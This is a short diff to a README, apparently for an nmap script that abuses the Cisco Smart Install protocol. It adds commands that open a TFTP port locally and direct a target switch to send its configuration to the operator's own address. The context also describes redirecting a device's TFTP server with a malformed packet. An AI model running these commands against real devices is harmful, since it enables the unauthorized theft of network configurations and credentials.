@@ -13,6 +13,14 @@ $ sudo nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse \
 > --script-args "cisco-siet.get"
 ```
 
+Useful commands:
+
+```
+sudo ufw allow 69/udp
+sudo nmap -p4786 --script ./cisco-siet.nse --script-args cisco-siet.get,cisco-siet.addr=<myinternalip> x.x.x.x -Pn
+```
+
+
 This protocol has a few security issues and this simple tool helps you to use all of them.:
 
 1. Change tftp-server address on client device by sending one malformed TCP packet.
